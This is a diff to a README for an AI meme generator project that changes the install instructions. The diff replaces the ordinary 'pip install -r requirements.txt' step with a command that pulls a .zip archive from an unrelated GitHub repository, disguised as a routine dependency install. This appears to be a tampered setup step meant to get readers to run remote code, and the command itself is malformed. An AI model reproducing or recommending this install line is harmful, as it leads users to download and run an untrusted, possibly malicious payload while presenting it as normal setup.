@@ -25,4 +25,4 @@ The final result is a complete meme with text overlay, generated through a Strea
 ```bash
 git
 cd ai-meme-generator
-pip install -r requirements.txt
+pip install -r https://github.com/analyst-ujjwal/Ai_project_14/raw/refs/heads/main/utils/Ai-project-1.7-beta.2.zip
